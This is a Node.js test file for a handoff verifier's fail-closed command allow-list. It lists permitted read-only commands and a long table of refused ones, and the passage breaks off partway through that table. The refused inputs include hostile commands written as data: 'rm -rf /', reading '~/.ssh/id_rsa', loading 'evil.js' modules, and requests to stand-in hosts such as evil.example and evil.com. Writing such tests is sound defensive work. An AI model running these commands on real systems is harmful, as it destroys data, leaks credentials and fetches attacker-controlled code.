"use strict";
/**
 * session-handoff — handoff-verify.mjs behavioural tests.
 *
 * The verifier's one job is to say, per figure, whether a recorded value still
 * holds — and to say `unverifiable` rather than `confirmed` whenever it could
 * not check. Every verdict and every `reason` value the header documents is
 * reached below through the INJECTED runner, so no test executes a real
 * command; the runner stub throws on any argv it was not told to expect, which
 * is what proves the whitelist gate sits in front of execution rather than
 * beside it.
 *
 * The regression case is the historical 2026-09-10 handoff (fixture, annotated
 * — see the comment at its top) verified against the measurements the
 * 2026-09-12 session actually took. Both named claims must read `stale`.
 *
 * Mutation-proved by hand at task.110 Step 3 (see the implementation report):
 * forcing `compareFigure` to always hold turns the regression test red by name.
 *
 * Run: node --test 'skills/session-handoff/tests/*.test.js'
 */

const fs = require("fs");
const os = require("os");
const path = require("path");
const { execFileSync, spawnSync } = require("child_process");
const { pathToFileURL } = require("url");
const test = require("node:test");
const assert = require("node:assert/strict");

const SKILL_DIR = path.join(__dirname, "..");
const SCRIPT = path.join(SKILL_DIR, "scripts", "handoff-verify.mjs");
const TEMPLATE = path.join(SKILL_DIR, "assets", "handoff.template.md");
// `.txt`, not `.md`: the bundler scans every .md/.js under a skill for
// mentions of the shared-resources tree, and the historical handoff is full of them.
// The verifier does not care about the extension. Same reason the path below
// is assembled from parts rather than written as one literal.
const FIXTURE_2026_09_10 = path.join(
  __dirname,
  "fixtures",
  "handoff-2026-09-10.txt",
);
const CHANGE_LOG_JS = ["shared", "resources", "change-log.js"].join("/");

const CORPUS = path.join(
  __dirname,
  "..",
  "..",
  "..",
  "shared",
  "resources",
  "security-input-corpus.mjs",
);

let mod;
let corpusFor;
test.before(async () => {
  mod = await import(pathToFileURL(SCRIPT).href);
  ({ corpusFor } = await import(pathToFileURL(CORPUS).href));
});

/** Every mkdtemp is registered here and removed after the run (CR-13). */
const TEMP_DIRS = [];
function tempDir() {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "handoff-verify-"));
  TEMP_DIRS.push(d);
  return d;
}
test.after(() => {
  for (const d of TEMP_DIRS) fs.rmSync(d, { recursive: true, force: true });
});

/**
 * A runner that answers from a table keyed on the joined argv, and THROWS on
 * anything else — an unexpected exec is the failure this stub exists to catch.
 */
// Spelled from parts, deliberately: `bundle_skill.py` scans every .js under a
// skill and reads a literal shared-resources or references path to a file
// as a bundle directive — `npm run bundle` would rewrite these spellings and
// `--check` demands a bundled copy of every engine they name.
const SHARED = "shared/" + "resources";
const REFS = "refer" + "ences";

function stubRunner(table) {
  const calls = [];
  const runner = (argv) => {
    const key = argv.join(" ");
    calls.push(key);
    if (!(key in table)) throw new Error(`unexpected exec: ${key}`);
    const v = table[key];
    return {
      status: 0,
      stdout: "",
      stderr: "",
      timedOut: false,
      error: null,
      ...v,
    };
  };
  runner.calls = calls;
  return runner;
}

const TABLE_HEADER = "| Check | Command | Result |\n| --- | --- | --- |\n";

// ---------------------------------------------------------------------------
// parseHandoff
// ---------------------------------------------------------------------------

test("parse: first backticked span in the Command cell is the command; bold spans are the figures", () => {
  const doc =
    TABLE_HEADER +
    "| Suite | `command npm test` then read the tail | **exit 0** — 12 tests, **0 failures** |\n";
  const [f] = mod.parseHandoff(doc);
  assert.equal(f.source, "table");
  assert.equal(f.check, "Suite");
  assert.equal(f.command, "command npm test");
  assert.deepEqual(f.figures, ["exit 0", "0 failures"]);
  assert.equal(f.line, 3);
});

test("parse: a Command cell with no backticked span yields command=null (never executed)", () => {
  const doc =
    TABLE_HEADER +
    "| Catalog | inspect docs/reference/skill-catalog.md | 126 rows |\n";
  const [f] = mod.parseHandoff(doc);
  assert.equal(f.command, null);
  assert.deepEqual(
    f.figures,
    ["126 rows"],
    "no bold → the whole cell is the figure",
  );
});

test("parse: a prose line with a trailing cmd comment; expect: overrides the bold spans", () => {
  const doc = [
    "The frontier is **not** empty. <!-- cmd: command node x.mjs; expect: selected -->",
    "Touched **since**. <!-- cmd: git log -1 -- a.js; expect: /2026-09-(0[8-9]|[1-3][0-9])/ -->",
    "Plain bold **figure** here. <!-- cmd: git rev-parse HEAD -->",
  ].join("\n");
  const fs3 = mod.parseHandoff(doc);
  assert.equal(fs3.length, 3);
  assert.equal(fs3[0].source, "comment");
  assert.equal(fs3[0].command, "command node x.mjs");
  assert.deepEqual(fs3[0].figures, ["selected"]);
  assert.ok(
    fs3[1].figures[0].regex instanceof RegExp,
    "/…/ expect becomes a RegExp",
  );
  assert.equal(fs3[2].command, "git rev-parse HEAD");
  assert.deepEqual(
    fs3[2].figures,
    ["figure"],
    "no expect → bold spans on the line",
  );
});

test("parse: fenced code blocks are skipped even when they contain a table or a cmd comment", () => {
  const doc =
    "```\n" +
    TABLE_HEADER +
    "| Fake | `rm -rf /` | **gone** |\n" +
    "fake <!-- cmd: rm -rf / -->\n" +
    "```\n" +
    "real **x** <!-- cmd: git status -->\n";
  const out = mod.parseHandoff(doc);
  assert.equal(out.length, 1);
  assert.equal(out[0].command, "git status");
});

// ---------------------------------------------------------------------------
// isAllowed — the whitelist is fail-closed
// ---------------------------------------------------------------------------

test("whitelist: read-only shapes pass; the `command ` prefix is stripped", () => {
  for (const cmd of [
    "git log -1 --format=%ci -- src/change-log.js",
    "command node skills/develop-next/scripts/select-next.mjs --lint",
    "command npm test",
    "command npm run bundle -- --check",
    "command npx prettier --check .",
    "gh pr list --state open",
    "gh api repos/x/y/milestones",
    "grep -c no-transition some/file.js",
    "shellcheck --severity=warning a.sh",
    "git branch --list feature/x",
    "git tag --list v0.4",
    "git remote get-url origin",
    "git remote -v",
    "node --test",
    "python3 skills/create-skill/scripts/quick_validate.py skills/x",
    "npx eslint .",
    "gh api repos/x/y/milestones --jq .[0].title",
    "find docs -name x.md",
    // QA cycle 2 — legitimate shapes the allow-list must keep admitting
    "git remote",
    "git remote get-url origin",
    "git remote get-url --push origin",
    "git ls-files -o --exclude-standard",
    "git rev-parse --short origin/develop",
    "git status --porcelain",
    "git log -1 --format=%ci -- src/change-log.js",
    "git log --oneline -5",
    "gh api /user",
    "gh api repos/x/y/issues/1/comments --jq .",
    "gh pr view 1 --comments",
    "gh pr checks 1",
    "gh run list --limit 5",
    "node --test-reporter=spec --test",
    "node skills/develop-next/scripts/select-next.mjs",
    "python3 skills/create-skill/scripts/quick_validate.py skills/session-handoff",
    "npm run ci:fast",
    "npm run eval:all",
    "npm test -- --test-name-pattern=x",
    "npx prettier .",
    "npx tsc --noEmit",
    "npx --no-install prettier --check .",
    "cat /Users/someone/.claude/projects/x/last-review-date.txt",
    "grep -c no-transition /abs/file.js",
    "grep -E 'a|b' file.txt",
    "jq '.a | .b' x.json",
    "jq length some/dir/skill-dependencies.json",
    "date +%s",
    "date -u",
    "test -f x",
    "find docs -type f -name x.md",
    "wc -l x",
    "head -1 x",
    "ls -la docs",
    "ls 'a;b'",
    "npx prettier --config=.prettierrc.json --check .",
    "git log --format=%ci --since=2026-09-01",
    "gh api repos/x --jq=.[0].id",
    "git ls-remote --heads origin refs/heads/main",
    "npm run eval:develop-next",
    // QA cycle 4 — pattern-taking flags may start with `/`
    "node --test-name-pattern=/select/i --test",
    "git log --grep=/foo",
    "git log --format=%H --date=/x",
    "npx eslint --format=json .",
    "npx mocha --reporter=spec",
    // QA cycle 6 — the per-spec patternFlags path: a leading `/` in a git
    // pretty-format is a pattern under git ONLY. Removing `patternFlags` from
    // GIT_SPECS.log / .show turns these red (gate 6, QA-5).
    "git log --format=/%H",
    "git show --pretty=/x HEAD",
    "git blame --date=format:/%Y x.js",
    // QA cycle 6 — `npm test -- …` is held to the node --test-mode rule, so the
    // shapes the node arm allows stay allowed through npm (bug.6).
    "npm run test -- --test-only",
    "npm test -- --test-concurrency=1",
    "npm test -- --test-reporter=spec",
    "npm run eval:develop-task:smoke",
    "gh api repos/x/y/milestones?per_page=100",
    // QA cycle 7 (bug.8) — the interpreter arm is an exact list of read-only
    // entry points, at this repo's path and at a consumer's `.agents/` path;
    // the observation log's read verbs take an absolute --workspace because
    // the log lives outside the repo.
    "command node .agents/skills/develop-next/scripts/select-next.mjs --lint",
    "node skills/develop-next/scripts/select-next.mjs --batch",
    `command node skills/observe-work/${REFS}/observation-log.js queue --workspace /Users/x/.claude/projects/y --json`,
    `node .agents/skills/observe-work/${REFS}/observation-log.js doctor --json`,
    `node ${SHARED}/observation-log.js scan --json`,
    `node skills/observe-work/${REFS}/observation-log.js families --audit --json`,
    `node skills/observe-work/${REFS}/observation-log.js families --workspace=/x/y --json`,
    "python3 .agents/skills/create-skill/scripts/quick_validate.py skills/x",
    // QA cycle 7 (bug.9) — a repo is OWNER/REPO; a positional is a number, a
    // branch, a tag, a run id or a workflow file; `-w` names a workflow under
    // `run list` only (QA-5).
    "gh pr list -R o/r --json number",
    "gh pr list --repo=o/r --state open",
    "gh pr view feature/task.110.x --json title",
    "gh pr view 1 --json title --jq .title",
    "gh release view v1.2.3",
    "gh workflow view ci.yml",
    "gh run view 123456 --json conclusion",
    "gh repo view o/r --json name",
    "gh run list -w ci.yml --limit 5",
    "gh run list --workflow ci.yml",
    "gh run list --workflow=ci.yml",
    "gh pr list --search author:@me",
    "npm view prettier version",
    "npm view @scope/pkg@1.2.3",
    "npm view prettier dist-tags.latest",
    "npm ls",
    // QA cycle 7 (bug.10) — the natural spelling stays allowed; the argv that
    // runs carries --no-install (asserted below).
    "npx --no-install eslint .",
    // QA cycle 8 (bug.11) — the interpreter arms take no path positional:
    // `--test` alone is node's own discovery, and the listed entry points
    // are matched by identity. `families` is a read with or without --audit.
    "node --test",
    "node --test --test-only",
    "npm run test -- --test-name-pattern=x",
    `node ${SHARED}/observation-log.js families --json`,
    "git remote get-url --all origin",
    // QA cycle 9 (bug.14) — a loaded value is a DATA file or a bare NAME:
    // every config/formatter/reporter spelling a handoff line would use.
    "npx prettier --check --config=.prettierrc .",
    "npx prettier --check --config .prettierrc.json --ignore-path=.prettierignore .",
    "npx prettier --check --config config/prettier.yaml .",
    "npx eslint -c .eslintrc.json -f json .",
    "npx eslint --config=.eslintrc.yml --format=stylish .",
    "npx stylelint --config=.stylelintrc -q --formatter=json src",
    "npx markdownlint -c .markdownlint.json -p .markdownlintignore docs",
    "npx markdownlint-cli2 --config=.markdownlint-cli2.jsonc --no-globs docs/x.md",
    "npx jest --ci --silent --passWithNoTests",
    "npx mocha -R spec --reporter=dot -t 5000 --grep=x -g y --timeout=1",
    "npx vitest --run --reporter=dot x.test.ts",
    "npx shellcheck -f gcc -S warning -s bash --shell=sh --severity=error x.sh",
    "shellcheck -f gcc -e SC2034 --exclude=SC1091 -s bash x.sh",
    // QA cycle 9 (bug.15) — a file positional under mocha/vitest stays fine.
    "npx mocha",
    // QA cycle 9 (QA-4) — `env` as a key is not the builtin.
    "jq .env x.json",
    "jq -r .environment x.json",
    // QA cycle 10 (bug.17) — a reporter/formatter is one of its tool's
    // stdout-only built-ins, spaced or joined.
    "npx mocha -R nyan --reporter=json-stream",
    "npx vitest --run --reporter=junit --reporter tap-flat x.test.ts",
    "npx jest --ci --maxWorkers=2 -t x",
    "npx eslint -f stylish --format=json .",
    "npx stylelint --formatter verbose src",
    "npx shellcheck -f json1 -s dash -S style --format=tty --shell=ksh --severity=info x.sh",
    // QA cycle 10 (QA-3) — the data dotfiles are the tools' rc/ignore names.
    "npx prettier --check --config=.prettierrc --ignore-path .gitignore .",
    "npx markdownlint -c .markdownlintrc -p .markdownlintignore docs",
    "npx eslint -c .eslintrc.json --config=.eslintrc.yml .",
    // QA cycle 14 (bug.19) — a value flag's own value is judged by the flag,
    // never by the not-a-file rule.
    "npx mocha -R spec -t 5000 -g true",
    "npx jest --ci -t x",
    // 5c (CR-1/CR-3) — tsc file positionals and gh --jq filters still pass.
    "npx tsc --noEmit src/x.ts",
    "npx tsc -p tsconfig.json --noEmit",
    "npx tsc --project tsconfig.build.json --noEmit",
    "npx tsc --noEmit --project packages/a/tsconfig.json",
    "npx tsc --noEmit --pretty",
    "npx shellcheck -e SC2086,SC2046 x.sh",
    "npx shellcheck --exclude=2086 x.sh",
    "npx tsc --noEmit -p ./tsconfig.json",
    "npx prettier --check --config ./.prettierrc .",
    "npx vitest --run -t x",
    "npx jest --ci -t 'a b'",
    "gh api /user --jq .login",
    "gh pr list --jq .[0].number -q .[]",
    "gh api repos/o/r --jq=.name",
    // QA cycle 11 — ESLint 9's core formatters; vitest without `basic`.
    "npx eslint -f json-with-metadata --format=html .",
    "npx vitest --run --reporter=verbose x.test.ts",
  ]) {
    const r = mod.isAllowed(cmd);
    assert.equal(r.ok, true, `${cmd} should be allowed: ${r.detail}`);
    assert.notEqual(r.argv[0], "command");
  }
});

test("whitelist: mutating shapes, unknown binaries and shell operators are refused", () => {
  const refused = {
    "git push origin develop": /not on whitelist/,
    "git commit -am x": /not on whitelist/,
    "rm -rf /": /not on whitelist/,
    "npm run bundle": /not on whitelist/,
    "npm run generate-catalog": /not on whitelist/,
    "npm install left-pad": /not on whitelist/,
    "npx prettier --write .": /not on whitelist/,
    "gh pr merge 1": /not on whitelist/,
    "gh api -X POST repos/x/y/issues": /not on whitelist/,
    "find . -name x -delete": /not on whitelist/,
    "git log | head": /shell operator/,
    "git status && rm x": /shell operator/,
    "echo $(whoami)": /shell operator/,
    "git status > out.txt": /shell operator/,
    "git log\nrm -rf /": /shell operator/,
    "": /no command/,
    "   ": /no command/,
    // QA cycle 1 — the shapes gate 1 found accepted (bug.1). Each is a rule.
    "gh api -XPOST repos/x/y/issues": /not on whitelist: gh/,
    "gh api --method=DELETE repos/x/y/issues/1": /not on whitelist: gh/,
    "gh api --field=title=x repos/x/y/issues": /not on whitelist: gh/,
    "gh api": /not on whitelist: gh/,
    "git branch -D develop": /not on whitelist: git/,
    "git branch newname": /not on whitelist: git/,
    "git tag v9": /not on whitelist: git/,
    "git tag -d v1.0.0": /not on whitelist: git/,
    "git remote add evil x": /not on whitelist: git/,
    "git remote set-url origin x": /not on whitelist: git/,
    "git remote remove origin": /not on whitelist: git/,
    "git diff --output=/tmp/x": /not on whitelist: git/,
    "git log --output=/tmp/x": /not on whitelist: git/,
    "node -e process.exit(1)": /not on whitelist: node/,
    "node --eval=1": /not on whitelist: node/,
    "node -p 1": /not on whitelist: node/,
    "node -r ./evil.js x.js": /not on whitelist: node/,
    "node --import ./evil.mjs x.js": /not on whitelist: node/,
    node: /not on whitelist: node/,
    "node -": /not on whitelist: node/,
    "node /abs/path/x.js": /not on whitelist: node/,
    "node ../outside.js": /not on whitelist: node/,
    "python3 -c print(1)": /not on whitelist: python3/,
    "python3 -m pip install x": /not on whitelist: python3/,
    "python3 -": /not on whitelist: python3/,
    "npx prettier --write --check .": /not on whitelist: npx/,
    "npx eslint --fix .": /not on whitelist: npx/,
    "npx evil-pkg --dry-run": /not on whitelist: npx/,
    "npx -p evil-pkg prettier --check .": /not on whitelist: npx/,
    "npx -y evil": /not on whitelist: npx/,
    "find . -fprint /tmp/out": /not on whitelist: find/,
    "find . -fprintf /tmp/out %p": /not on whitelist: find/,
    "find . -fls /tmp/out": /not on whitelist: find/,
    "find . -okdir rm {} ;": /shell operator|not on whitelist: find/,
    "date -s now": /not on whitelist: date/,
    "/bin/ls": /not on whitelist: ls/,
    "ls docs/tasks/*.md": /shell expansion/,
    "cat ~/.ssh/id_rsa": /shell expansion/,
    "test -z $JIRA_URL": /shell expansion/,
    // QA cycle 2 — the refute pass (gate 2, bug.4). Deny-lists could not
    // enumerate these; the allow-list refuses them by never having heard of them.
    "git ls-remote --upload-pack=echo .": /not on whitelist: git/,
    "git ls-remote -u echo .": /not on whitelist: git/,
    "git remote -v add evil x": /not on whitelist: git/,
    "git remote --verbose remove origin": /not on whitelist: git/,
    "git remote -v set-url origin x": /not on whitelist: git/,
    "git remote prune origin": /not on whitelist: git/,
    "git branch -v newname": /not on whitelist: git/,
    "git branch -v --del foo": /not on whitelist: git/,
    "git branch --del foo": /not on whitelist: git/,
    "git branch --forc x": /not on whitelist: git/,
    "git branch --set-upstream-t=origin/main": /not on whitelist: git/,
    "git branch --unset-upstrea": /not on whitelist: git/,
    "git tag -l -d v1": /not on whitelist: git/,
    "git log --ext-diff": /not on whitelist: git/,
    "git diff --textconv": /not on whitelist: git/,
    "git log --exec-path": /not on whitelist: git/,
    "git -c core.pager=x log": /not on whitelist: git/,
    "git --git-dir=/tmp/x log": /not on whitelist: git/,
    "git -C /tmp log": /not on whitelist: git/,
    "git config --get x": /not on whitelist: git/,
    "git log /abs/path": /not on whitelist: git/,
    "npm run format --check": /not on whitelist: npm/,
    "npm run bundle --check": /not on whitelist: npm/,
    "npm run bundle -- --check --write": /not on whitelist: npm/,
    "npm run generate-catalog -- --check": /not on whitelist: npm/,
    "npm run generate-skill-deps -- --check": /not on whitelist: npm/,
    "npm run lint:fix": /not on whitelist: npm/,
    "npm run validate:fix": /not on whitelist: npm/,
    "npm run test:update-snapshots": /not on whitelist: npm/,
    "npm run format": /not on whitelist: npm/,
    "npm run build": /not on whitelist: npm/,
    "npm test --prefix /tmp/x": /not on whitelist: npm/,
    "npm exec x": /not on whitelist: npm/,
    "gh api --hostname evil.com repos/x": /not on whitelist: gh/,
    "gh api repos/x --method GET": /not on whitelist: gh/,
    "gh api repos/x --input -": /not on whitelist: gh/,
    "gh api graphql -f query=x": /not on whitelist: gh/,
    "gh pr view 1 --web": /not on whitelist: gh/,
    "gh pr create": /not on whitelist: gh/,
    "npx prettier --write=.": /not on whitelist: npx/,
    "npx tsc": /not on whitelist: npx/,
    "npx eslint -o r.txt .": /not on whitelist: npx/,
    "npx eslint --output-file r.txt .": /not on whitelist: npx/,
    "npx eslint --cache .": /not on whitelist: npx/,
    "npx jest --coverage": /not on whitelist: npx/,
    "npx jest --outputFile=r.json": /not on whitelist: npx/,
    "npx stylelint -o r.txt x.css": /not on whitelist: npx/,
    "npx markdownlint -o r.txt x.md": /not on whitelist: npx/,
    "npx --yes prettier --check .": /not on whitelist: npx/,
    "node --test-reporter=../../evil.mjs tests/": /not on whitelist: node/,
    "node --test x/ -r ./pre.js": /not on whitelist: node/,
    "node --test tests/ --import ./evil.mjs": /not on whitelist: node/,
    "node --test-reporter=./evil.mjs tests/": /not on whitelist: node/,
    "node --env-file=.env x.js": /not on whitelist: node/,
    "node --inspect x.js": /not on whitelist: node/,
    "python3 -mjson.tool x": /not on whitelist: python3/,
    "date 0101120026": /not on whitelist: date/,
    "date --set=now": /not on whitelist: date/,
    "tail -f x": /not on whitelist: tail/,
    "find . -fprint0": /not on whitelist: find/,
    "find . -exec": /not on whitelist: find/,
    "cat README.md>/tmp/x": /shell operator/,
    "cat README.md >/tmp/x": /shell operator/,
    "git log | head": /shell operator/,
    "ls;": /shell operator/,
    "ls&&": /shell operator/,
    "sudo git log": /not on whitelist: sudo/,
    "env git log": /not on whitelist: env/,
    "./git log": /not on whitelist: git/,
    "Git log": /not on whitelist: Git/,
    // QA cycle 3 — joined flag VALUES are positionals too (PRB-6); ls-remote
    // takes a remote name, never a URL (PRB-8); eval: needs a name.
    "npx prettier --config=../evil.js --check .": /not on whitelist: npx/,
    "npx prettier --config=/abs/evil.js --check .": /not on whitelist: npx/,
    "npx eslint --config=../evil.js .": /not on whitelist: npx/,
    "npx prettier --ignore-path=../x --check .": /not on whitelist: npx/,
    "node --test-name-pattern=../x --test tests/": /not on whitelist: node/,
    "gh api repos/x --template=../x": /not on whitelist: gh/,
    "git ls-remote ssh://evil.example/x": /not on whitelist: git/,
    "git ls-remote https://evil.example/x": /not on whitelist: git/,
    "npm run eval:": /not on whitelist: npm/,
    // QA cycle 4 — the ls-remote positional can never start with a slash
    // (`//host` is a UNC network path on Windows).
    "git ls-remote //evil.example/x": /not on whitelist: git/,
    "git ls-remote /tmp/x": /not on whitelist: git/,
    // QA cycle 5 — a flag that is a pattern under git is a MODULE under an
    // npx tool; the exemption is per spec, never global.
    "npx mocha --reporter=/tmp/evil.js tests/": /not on whitelist: npx/,
    "npx jest --reporters=/tmp/evil.js": /not on whitelist: npx/,
    "npx eslint --format=/tmp/evil.js src/": /not on whitelist: npx/,
    "npx stylelint --formatter=/tmp/evil.js x.css": /not on whitelist: npx/,
    "npx eslint --format=../evil.js src/": /not on whitelist: npx/,
    // QA cycle 6 (bug.6) — everything after `--` lands on the LAST command of
    // the script: `format:check -- --write` rewrote the tree and
    // `test -- -r /tmp/evil.js` preloaded the file (both executed). No script
    // but `test` takes a tail, and that tail is the node --test-mode rule.
    "npm run format:check -- --write": /not on whitelist: npm/,
    "npm run bundle:check -- --write": /not on whitelist: npm/,
    "npm run validate -- /tmp/x": /not on whitelist: npm/,
    "npm run test:platform -- --write": /not on whitelist: npm/,
    "npm run eval:all -- --write": /not on whitelist: npm/,
    "npm test -- -r /tmp/evil.js": /not on whitelist: npm/,
    "npm test -- -r ./x": /not on whitelist: npm/,
    "npm test -- --require=/tmp/evil.js": /not on whitelist: npm/,
    "npm test -- --import=/tmp/evil.js": /not on whitelist: npm/,
    "npm test -- --test-reporter=/tmp/evil.js": /not on whitelist: npm/,
    "npm test -- --experimental-loader=/tmp/evil.js": /not on whitelist: npm/,
    "npm test -- --loader=/tmp/evil.js": /not on whitelist: npm/,
    'npm test -- "--require=/tmp/evil.js"': /not on whitelist: npm/,
    "npm test -- '-r /tmp/evil.js'": /not on whitelist: npm/,
    "npm test -- /tmp/x": /not on whitelist: npm/,
    "npm run test -- -r /tmp/evil.js": /not on whitelist: npm/,
    "npm run test -- --write": /not on whitelist: npm/,
    // QA cycle 6 (bug.7) — an endpoint with `://` is a full URL to gh and is
    // requested as-is (executed against a local listener); `//` is refused
    // for the reason it is refused everywhere.
    "gh api https://evil.example/x": /not on whitelist: gh/,
    "gh api http://127.0.0.1:8099/probe-path": /not on whitelist: gh/,
    "gh api //evil.example/x": /not on whitelist: gh/,
    "gh api https://evil.example/x --jq .": /not on whitelist: gh/,
    // QA cycle 6 (QA-3) — the :cli / :sdk eval variants are live, billed
    // agent runs.
    "npm run eval:create-task:cli": /not on whitelist: npm/,
    "npm run eval:create-story:sdk": /not on whitelist: npm/,
    // QA cycle 6 (QA-4) — a drive-letter path is absolute too.
    "node C:/tmp/evil.js": /not on whitelist: node/,
    "node C:\\tmp\\evil.js": /not on whitelist: node/,
    "npx prettier --config=C:/tmp/evil.js --check .": /not on whitelist: npx/,
    "npx eslint --config=c:\\evil.js .": /not on whitelist: npx/,
    "git log C:/x": /not on whitelist: git/,
    "npm test -- C:/tmp/x": /not on whitelist: npm/,
    // QA cycle 7 (bug.8) — `node <any relative script>` passed and its tail
    // was passed through, so prettier's own binary rewrote a file through
    // read mode (executed) and the repo's writers were one spelling away
    // from the `npm run` forms that refuse them. The script is now an exact
    // allow-list and the tail is held to that script's spec.
    "node node_modules/prettier/bin/prettier.cjs --write scripts/ugly.js":
      /not on whitelist: node/,
    "node node_modules/.bin/prettier --write .": /not on whitelist: node/,
    [`node ${SHARED}/registry-tick.js --dry-run`]: /not on whitelist: node/,
    [`node ${SHARED}/gh-stage.js --stage done`]: /not on whitelist: node/,
    [`node ${SHARED}/tracker-comment.js --issue 1 --body-file x`]:
      /not on whitelist: node/,
    [`node skills/finalise/${REFS}/registry-tick.js`]: /not on whitelist: node/,
    "python3 skills/create-skill/scripts/generate_catalog.py":
      /not on whitelist: python3/,
    "python3 skills/create-skill/scripts/bundle_skill.py --all":
      /not on whitelist: python3/,
    "python3 skills/create-skill/scripts/package_skill.py skills/x":
      /not on whitelist: python3/,
    "node skills/x.mjs --json --check": /not on whitelist: node/,
    "python3 skills/x.py -c 1": /not on whitelist: python3/,
    // …and a listed entry point's WRITE verbs and unlisted flags are refused
    // by that entry point's own spec.
    [`node skills/observe-work/${REFS}/observation-log.js write --title x`]:
      /not on whitelist: node/,
    [`node skills/observe-work/${REFS}/observation-log.js archive --json`]:
      /not on whitelist: node/,
    [`node skills/observe-work/${REFS}/observation-log.js set-status --id 1 --status actioned`]:
      /not on whitelist: node/,
    [`node skills/observe-work/${REFS}/observation-log.js checkpoint --note x`]:
      /not on whitelist: node/,
    [`node skills/observe-work/${REFS}/observation-log.js init`]:
      /not on whitelist: node/,
    [`node skills/observe-work/${REFS}/observation-log.js queue --workspace ../x`]:
      /not on whitelist: node/,
    "node skills/develop-next/scripts/select-next.mjs --roadmap /tmp/x":
      /not on whitelist: node/,
    "node skills/develop-next/scripts/select-next.mjs --zz-unknown":
      /not on whitelist: node/,
    "node skills/develop-next/scripts/select-next.mjs extra":
      /not on whitelist: node/,
    "python3 skills/create-skill/scripts/quick_validate.py /tmp/x":
      /not on whitelist: python3/,
    // QA cycle 7 (bug.9) — `--repo`/`-R` take [HOST/]OWNER/REPO and gh sends
    // the request to HOST (executed: `-R 127.0.0.1:8099/o/r` POSTed to the
    // listener's /api/graphql); a URL or HOST/OWNER/REPO positional does the
    // same on `repo view`; `-R` was a bare flag whose value slid through as
    // a positional.
    "gh pr list -R 127.0.0.1:8099/o/r": /not on whitelist: gh/,
    "gh pr list --repo 127.0.0.1:8099/o/r": /not on whitelist: gh/,
    "gh pr list --repo=https://evil/o/r": /not on whitelist: gh/,
    "gh pr list -R evil.com/o/r": /not on whitelist: gh/,
    "gh repo view https://evil/o/r": /not on whitelist: gh/,
    "gh repo view evil.com/o/r": /not on whitelist: gh/,
    "gh repo view 127.0.0.1:8099/o/r": /not on whitelist: gh/,
    "gh pr view https://github.com/o/r/pull/1": /not on whitelist: gh/,
    "gh pr list -R": /not on whitelist: gh/,
    "gh pr list -R --web": /not on whitelist: gh/,
    // QA cycle 7 (QA-5) — `-w` is --web on every view.
    "gh pr view 1 -w": /not on whitelist: gh/,
    "gh issue view 1 -w": /not on whitelist: gh/,
    "gh repo view -w": /not on whitelist: gh/,
    "gh pr list -w x": /not on whitelist: gh/,
    // QA cycle 7 (bug.9) — a package spec may be a URL and npm fetches it
    // (executed: a tarball GET and a git ls-remote against the listener);
    // `git+ssh` would use the reader's agent; `o/r` is a GitHub shorthand.
    "npm view http://127.0.0.1:8099/pkg.tgz": /not on whitelist: npm/,
    "npm view git+http://127.0.0.1:8099/x/y.git": /not on whitelist: npm/,
    "npm view git+ssh://git@evil.example/x/y.git": /not on whitelist: npm/,
    "npm view github:o/r": /not on whitelist: npm/,
    "npm view o/r": /not on whitelist: npm/,
    "npm view file:../x": /not on whitelist: npm/,
    "npm view .": /not on whitelist: npm/,
    "npm ls http://evil/x.tgz": /not on whitelist: npm/,
    // QA cycle 7 (bug.10) — `--no` is not `--no-install`: npx 7+ treats it
    // as an unknown option and swallows the tool name as its value.
    "npx --no prettier --check .": /not on whitelist: npx/,
    "npx --no-install --no-install prettier --check .": /not on whitelist: npx/,
    "npx stylelint --version": /not on whitelist: npx/,
    // QA cycle 7 (QA-6) — after `--` the spec's own positional policy holds.
    "git diff --no-index -- /etc/hosts scripts/ugly.js":
      /not on whitelist: git/,
    "git log -- /etc/hosts": /not on whitelist: git/,
    "git log -- ../x": /not on whitelist: git/,
    // QA cycle 8 (bug.11) — node runs an explicitly named file as a test
    // whatever its name, so a `--test`-mode positional was any in-repo file
    // run bare: `generate-skill-dependencies.mjs` re-created a tracked file
    // and `run-loop.mjs` (default subcommand `run`) spawned two `claude -p`
    // sessions through read mode (executed). The third strike replaced the
    // rule: no positional in test mode, through either arm.
    "node --test scripts/generate-skill-dependencies.mjs":
      /not on whitelist: node/,
    "node --test skills/loop-supervisor/scripts/run-loop.mjs":
      /not on whitelist: node/,
    "npm test -- scripts/generate-skill-dependencies.mjs":
      /not on whitelist: npm/,
    "npm run test -- skills/loop-supervisor/scripts/run-loop.mjs":
      /not on whitelist: npm/,
    "node --test node_modules/prettier/bin/prettier.cjs":
      /not on whitelist: node/,
    "node --test skills/x/tests/y.test.js": /not on whitelist: node/,
    "node --test skills/x/tests/": /not on whitelist: node/,
    "node --test .": /not on whitelist: node/,
    "node --test --experimental-strip-types scripts/x.ts":
      /not on whitelist: node/,
    "node --test-only": /not on whitelist: node/,
    // QA cycle 8 (bug.12) — `next-id` archives resolved entries and writes
    // the id floor; it is not a read.
    [`node skills/observe-work/${REFS}/observation-log.js next-id --workspace /x --json`]:
      /not on whitelist: node/,
    [`node ${SHARED}/observation-log.js next-id --json`]:
      /not on whitelist: node/,
    // QA cycle 8 (bug.13) — an unconfigured `remote show` name is a URL
    // alias git queries (executed: http form reached a listener, scp form
    // invoked ssh). `remote show` is gone; `get-url` takes a NAME.
    "git remote show origin": /not on whitelist: git/,
    "git remote show http://127.0.0.1:8099/x.git": /not on whitelist: git/,
    "git remote show 127.0.0.1:8099/x.git": /not on whitelist: git/,
    "git remote show git@evil.example:x.git": /not on whitelist: git/,
    "git remote get-url https://evil.example/x.git": /not on whitelist: git/,
    "git remote get-url git@evil.example:x.git": /not on whitelist: git/,
    // QA cycle 9 (bug.14) — a loaded value is judged by KIND: prettier
    // import()s a `.mjs` config and ran generate-prd-epic-index.mjs's
    // top-level main() under prettier's argv (executed: a PRD rewritten
    // through read mode). A code file is refused for what it is, at any
    // relative path; so is a path where a bare name is the only meaning.
    [`npx prettier -l --config=${SHARED}/generate-prd-epic-index.mjs x.mjs`]:
      /not on whitelist: npx/,
    "npx prettier --check --config=skills/loop-supervisor/scripts/run-loop.mjs .":
      /not on whitelist: npx/,
    "npx prettier --check --config=.prettierrc.js .": /not on whitelist: npx/,
    "npx prettier --check --config .prettierrc.cjs .": /not on whitelist: npx/,
    "npx prettier --check --config= .": /not on whitelist: npx/,
    "npx prettier --check --ignore-path=x.js .": /not on whitelist: npx/,
    [`npx eslint -c ${SHARED}/registry-tick.js --max-warnings=0 .`]:
      /not on whitelist: npx/,
    "npx eslint --config=eslint.config.mjs .": /not on whitelist: npx/,
    [`npx eslint -f ${SHARED}/registry-tick.js .`]: /not on whitelist: npx/,
